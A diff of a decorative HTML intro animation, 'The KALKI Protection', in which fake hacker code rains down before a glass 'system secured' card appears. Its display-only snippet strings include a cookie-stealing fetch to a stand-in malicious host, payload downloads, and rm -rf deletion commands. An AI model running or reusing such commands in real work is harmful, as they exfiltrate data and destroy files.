@@ -5,7 +5,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>The KALKI Protection</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Space+Mono&display=swap');
+        /* CSS Variables for theming */
+        :root {
+            --bg-dark: #050505;
+            --bg-glow: radial-gradient(circle at 50% 50%, #0a1128 0%, #000000 100%);
+            --red-alert: #ff2a2a;
+            --glass-bg: rgba(255, 255, 255, 0.03);
+            --glass-border: rgba(255, 255, 255, 0.08);
+            --glass-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+            --glass-glow: 0 0 60px rgba(40, 100, 255, 0.15);
+            --font-stack: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
 
         * {
             margin: 0;
@@ -13,246 +23,334 @@
             box-sizing: border-box;
         }
 
-        body, html {
-            width: 100%;
-            height: 100%;
+        body {
+            background-color: var(--bg-dark);
+            background: var(--bg-glow);
+            color: #fff;
+            font-family: var(--font-stack);
+            height: 100vh;
+            width: 100vw;
             overflow: hidden;
-            background-color: #000;
-        }
-
-        /* --- Hacker Screen UI --- */
-        #hacker-screen {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #050505;
-            color: #0f0;
-            font-family: 'Space Mono', monospace;
-            font-size: 14px;
-            padding: 20px;
-            overflow: hidden;
-            z-index: 10;
-        }
-
-        .code-line {
-            opacity: 0.8;
-            margin-bottom: 2px;
-            white-space: pre-wrap;
-        }
-
-        /* --- Premium Apple Liquid Glass UI --- */
-        #premium-screen {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            /* Animated gradient background */
-            background: linear-gradient(45deg, #0a0a0a, #1a1a2e, #0f0f1a, #050505);
-            background-size: 400% 400%;
-            animation: gradientBG 15s ease infinite;
             display: flex;
             justify-content: center;
             align-items: center;
-            opacity: 0;
-            visibility: hidden;
-            transition: opacity 1.5s ease-in-out;
-            z-index: 5;
-        }
-
-        /* Abstract glowing orbs behind the glass */
-        .orb {
-            position: absolute;
-            border-radius: 50%;
-            filter: blur(80px);
-            z-index: 0;
-        }
-        .orb-1 {
-            width: 300px;
-            height: 300px;
-            background: rgba(100, 150, 255, 0.3);
-            top: 20%;
-            left: 30%;
-            animation: float 8s ease-in-out infinite;
-        }
-        .orb-2 {
-            width: 400px;
-            height: 400px;
-            background: rgba(255, 255, 255, 0.1);
-            bottom: 10%;
-            right: 20%;
-            animation: float 10s ease-in-out infinite reverse;
-        }
-
-        /* Liquid Glass Card */
-        .glass-card {
             position: relative;
-            z-index: 2;
-            background: rgba(255, 255, 255, 0.03);
-            backdrop-filter: blur(30px);
-            -webkit-backdrop-filter: blur(30px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 30px;
-            padding: 60px 80px;
-            text-align: center;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5), inset 0 0 0 1px rgba(255, 255, 255, 0.05);
-            transform: translateY(30px) scale(0.95);
-            opacity: 0;
-            transition: all 1.5s cubic-bezier(0.2, 0.8, 0.2, 1);
         }
 
-        .glass-card.show {
-            transform: translateY(0) scale(1);
-            opacity: 1;
-        }
-
-        .glass-card h1 {
-            font-family: 'Inter', sans-serif;
-            font-weight: 300;
-            font-size: 3rem;
-            letter-spacing: 4px;
-            color: #ffffff;
-            margin: 0;
-            background: linear-gradient(135deg, #fff, #888);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .glass-card p {
-            font-family: 'Inter', sans-serif;
-            font-weight: 400;
-            font-size: 0.9rem;
-            letter-spacing: 2px;
-            color: rgba(255, 255, 255, 0.5);
-            margin-top: 15px;
-            text-transform: uppercase;
-        }
-
-        /* --- Effects --- */
-        #flash {
+        /* --- HACK PHASE STYLES --- */
+        #hack-container {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: white;
-            opacity: 0;
+            z-index: 10;
             pointer-events: none;
+            transition: opacity 0.8s ease-out;
+        }
+
+        .code-rain {
+            position: absolute;
+            font-family: monospace;
+            font-size: 14px;
+            color: var(--red-alert);
+            white-space: pre;
+            opacity: 0.8;
+            filter: drop-shadow(0 0 5px var(--red-alert));
+            animation: moveDown linear infinite, glitch-text 0.2s infinite alternate;
+        }
+
+        .warning-overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: clamp(24px, 5vw, 64px);
+            font-weight: 900;
+            color: var(--red-alert);
+            text-align: center;
+            letter-spacing: 5px;
+            text-shadow: 0 0 20px var(--red-alert), 0 0 40px var(--red-alert);
+            animation: pulse-alert 0.5s infinite;
+        }
+
+        .scanline {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: rgba(255, 42, 42, 0.5);
+            box-shadow: 0 0 20px rgba(255, 42, 42, 0.8);
+            animation: scan 2s linear infinite;
+        }
+
+        .vignette-red {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            box-shadow: inset 0 0 150px rgba(255, 0, 0, 0.2);
+            animation: flash-red 2s infinite;
+        }
+
+        /* --- SECURE PHASE (PREMIUM GLASS UI) --- */
+        #secure-container {
+            position: absolute;
             z-index: 20;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            transform: scale(0.95);
+            pointer-events: none;
+            transition: opacity 1.5s cubic-bezier(0.25, 1, 0.5, 1), 
+                        transform 1.5s cubic-bezier(0.25, 1, 0.5, 1);
         }
 
-        @keyframes gradientBG {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
+        #secure-container.active {
+            opacity: 1;
+            transform: scale(1);
+            pointer-events: all;
         }
 
-        @keyframes float {
-            0% { transform: translateY(0px) scale(1); }
-            50% { transform: translateY(-30px) scale(1.05); }
-            100% { transform: translateY(0px) scale(1); }
+        .glass-card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border: 1px solid var(--glass-border);
+            border-radius: 32px;
+            padding: 60px 40px;
+            text-align: center;
+            box-shadow: var(--glass-shadow), var(--glass-glow);
+            max-width: 90%;
+            width: 480px;
+            position: relative;
+            overflow: hidden;
         }
 
+        /* Subtle moving reflection for liquid glass effect */
+        .glass-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                rgba(255, 255, 255, 0) 0%,
+                rgba(255, 255, 255, 0.05) 40%,
+                rgba(255, 255, 255, 0) 50%
+            );
+            transform: rotate(30deg);
+            animation: glass-shine 6s infinite linear;
+            pointer-events: none;
+        }
+
+        h1 {
+            font-size: clamp(28px, 4vw, 36px);
+            font-weight: 600;
+            letter-spacing: -0.5px;
+            margin-bottom: 12px;
+            background: linear-gradient(135deg, #ffffff 0%, #a0c0ff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 4px 20px rgba(160, 192, 255, 0.2);
+        }
+
+        p {
+            font-size: clamp(14px, 2vw, 16px);
+            color: rgba(255, 255, 255, 0.6);
+            font-weight: 400;
+            letter-spacing: 0.5px;
+            margin-bottom: 30px;
+        }
+
+        #replay-btn {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: #fff;
+            padding: 12px 24px;
+            border-radius: 100px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            outline: none;
+            backdrop-filter: blur(10px);
+        }
+
+        #replay-btn:hover {
+            background: rgba(255, 255, 255, 0.15);
+            border-color: rgba(255, 255, 255, 0.3);
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
+            transform: translateY(-2px);
+        }
+
+        /* --- ANIMATIONS --- */
+        @keyframes scan {
+            0% { top: -10px; }
+            100% { top: 100%; }
+        }
+
+        @keyframes moveDown {
+            0% { transform: translateY(-100%); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(100vh); opacity: 0; }
+        }
+
+        @keyframes pulse-alert {
+            0%, 100% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+            50% { opacity: 0.6; transform: translate(-50%, -50%) scale(1.02); }
+        }
+
+        @keyframes flash-red {
+            0%, 100% { box-shadow: inset 0 0 50px rgba(255, 0, 0, 0.1); }
+            50% { box-shadow: inset 0 0 150px rgba(255, 0, 0, 0.3); }
+        }
+
+        @keyframes glitch-text {
+            0% { transform: skewX(0deg); }
+            20% { transform: skewX(-5deg); filter: drop-shadow(2px 0 0 rgba(0,255,255,0.5)); }
+            40% { transform: skewX(5deg); filter: drop-shadow(-2px 0 0 rgba(255,0,255,0.5)); }
+            60% { transform: skewX(0deg); }
+            100% { transform: skewX(0deg); }
+        }
+
+        @keyframes glass-shine {
+            0% { top: -150%; left: -150%; }
+            100% { top: 150%; left: 150%; }
+        }
+
+        /* Utility class for rapid deletion of code elements */
+        .deleting {
+            opacity: 0 !important;
+            transform: scale(0.8) !important;
+            filter: blur(4px) !important;
+            transition: all 0.3s cubic-bezier(0.25, 1, 0.5, 1) !important;
+        }
     </style>
 </head>
 <body>
 
-    <div id="hacker-screen"></div>
+    <div id="hack-container">
+        <div class="vignette-red"></div>
+        <div class="scanline"></div>
+        <div class="warning-overlay" id="warning-text">SYSTEM BREACH DETECTED</div>
+        <div id="code-plane"></div>
+    </div>
 
-    <div id="flash"></div>
-
-    <div id="premium-screen">
-        <div class="orb orb-1"></div>
-        <div class="orb orb-2"></div>
-        <div class="glass-card" id="glass-card">
+    <div id="secure-container">
+        <div class="glass-card">
             <h1>The KALKI Protection</h1>
-            <p>System Secured</p>
+            <p>Your system is secured.</p>
+            <button id="replay-btn">Replay Sequence</button>
         </div>
     </div>
 
     <script>
-        const hackerScreen = document.getElementById('hacker-screen');
-        const premiumScreen = document.getElementById('premium-screen');
-        const flash = document.getElementById('flash');
-        const glassCard = document.getElementById('glass-card');
-
-        // Fake code snippets to simulate a hack
+        // Decorative code snippets representing various languages
         const codeSnippets = [
-            "def bypass_security():\n    return inject_payload(0x8F90)",
-            "<div><script>alert('System Compromised');</script></div>",
-            "import os\nos.system('rm -rf /user/data')",
-            "fetch('https://malicious-server.net/steal?data=' + document.cookie)",
-            "Connecting to backdoor at 192.168.1.55:4444...",
-            "<style>body { background: black !important; }</style>",
-            "while (true) { allocateMemory(9999); }",
-            "SELECT * FROM users WHERE admin = 1 --",
-            "Kernel panic - not syncing: VFS: Unable to mount root fs",
-            "sys.stdout.write('Extracting passwords...')"
+            "function bypassFirewall() {\n  document.cookie = 'admin=true';\n}",
+            "import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('10.0.0.1', 8080))",
+            "sudo rm -rf /var/logs/security",
+            "SELECT * FROM users WHERE access_level = 'ROOT';",
+            "01101000 01100001 01100011 01101011",
+            "while(true) {\n  bruteForce(target_ip);\n}",
+            "<script>alert('System Compromised');<\/script>",
+            "OVERRIDE_MAINFRAME = True\nif OVERRIDE_MAINFRAME:\n  disable_alarms()",
+            "fetch('http://dark-server.net/payload')\n.then(res => res.json())",
+            "var mem = process.memoryUsage();\ninjectPayload(mem.heapUsed);"
         ];
 
         let hackInterval;
+        let hackTimeout;
+        let cleanupTimeout;
 
-        // Function to simulate typing/scrolling hacker code
-        function runHackerCode() {
-            hackInterval = setInterval(() => {
-                const line = document.createElement('div');
-                line.className = 'code-line';
-                // Pick random code or generate random hex
-                if (Math.random() > 0.3) {
-                    line.textContent = codeSnippets[Math.floor(Math.random() * codeSnippets.length)];
-                } else {
-                    let hex = '';
-                    for(let i=0; i<10; i++) {
-                        hex += Math.floor(Math.random()*16777215).toString(16).padEnd(6, '0') + " ";
-                    }
-                    line.textContent = "0x" + hex.toUpperCase();
-                }
-                
-                hackerScreen.appendChild(line);
+        const hackContainer = document.getElementById('hack-container');
+        const codePlane = document.getElementById('code-plane');
+        const secureContainer = document.getElementById('secure-container');
+        const warningText = document.getElementById('warning-text');
+        const replayBtn = document.getElementById('replay-btn');
 
-                // Keep screen from overflowing infinitely
-                if (hackerScreen.childNodes.length > 40) {
-                    hackerScreen.removeChild(hackerScreen.firstChild);
-                }
-            }, 80); // Speed of code generation
-        }
-
-        // Trigger the transition
-        function systemWipeAndProtect() {
-            // Stop the hacker code
-            clearInterval(hackInterval);
+        // Function to spawn a random code block falling down
+        function spawnCode() {
+            const el = document.createElement('div');
+            el.className = 'code-rain';
             
-            // Flash effect (Wiping the system)
-            flash.style.transition = "opacity 0.1s ease-out";
-            flash.style.opacity = "1";
+            // Random snippet
+            el.innerText = codeSnippets[Math.floor(Math.random() * codeSnippets.length)];
+            
+            // Random styling for chaos
+            el.style.left = Math.random() * 90 + 'vw';
+            el.style.animationDuration = (Math.random() * 2 + 1) + 's';
+            el.style.fontSize = Math.floor(Math.random() * 14 + 10) + 'px';
+            
+            codePlane.appendChild(el);
 
+            // Remove element after it falls
             setTimeout(() => {
-                // Remove hacker screen while flash is fully white
-                hackerScreen.style.display = 'none';
-                
-                // Show premium screen
-                premiumScreen.style.visibility = 'visible';
-                premiumScreen.style.opacity = '1';
-                
-                // Fade out flash slowly
-                flash.style.transition = "opacity 1.2s ease-in";
-                flash.style.opacity = "0";
-
-                // Trigger liquid glass animation
-                setTimeout(() => {
-                    glassCard.classList.add('show');
-                }, 400);
-
-            }, 150); // Flash duration
+                if(el.parentElement) el.remove();
+            }, 3000);
         }
 
-        // Start sequence
-        runHackerCode();
+        // Main Intro Sequence
+        function startSequence() {
+            // Reset states
+            codePlane.innerHTML = '';
+            hackContainer.style.opacity = '1';
+            secureContainer.classList.remove('active');
+            warningText.innerText = 'SYSTEM BREACH DETECTED';
+            warningText.style.color = 'var(--red-alert)';
 
-        // Initiate wipe after 3.5 seconds
-        setTimeout(systemWipeAndProtect, 3500);
+            // Phase 1: Start Chaos
+            hackInterval = setInterval(spawnCode, 80);
+
+            // Switch warning text midway
+            setTimeout(() => {
+                warningText.innerText = 'OVERRIDING SECURITY PROTOCOLS...';
+            }, 1500);
+
+            // Phase 2: System takes control (Cleanup)
+            hackTimeout = setTimeout(() => {
+                clearInterval(hackInterval);
+                warningText.innerText = 'THREAT NEUTRALIZED';
+                warningText.style.color = '#00ffcc'; // Temporary cyan before disappearing
+
+                // Force all current code to "delete" itself quickly
+                const allCodeElements = document.querySelectorAll('.code-rain');
+                allCodeElements.forEach(code => {
+                    code.classList.add('deleting');
+                });
+
+                // Phase 3: Transition to Premium Glass UI
+                cleanupTimeout = setTimeout(() => {
+                    hackContainer.style.opacity = '0';
+                    
+                    setTimeout(() => {
+                        secureContainer.classList.add('active');
+                    }, 500); // Wait for hack container to fade out
+                }, 800); // Time it takes to show "THREAT NEUTRALIZED"
+
+            }, 4000); // Chaos lasts 4 seconds
+        }
+
+        // Event Listeners
+        replayBtn.addEventListener('click', () => {
+            // Prevent clicking rapidly
+            clearTimeout(hackTimeout);
+            clearTimeout(cleanupTimeout);
+            clearInterval(hackInterval);
+            startSequence();
+        });
+
+        // Initialize animation on load
+        window.onload = startSequence;
 
     </script>
 </body>
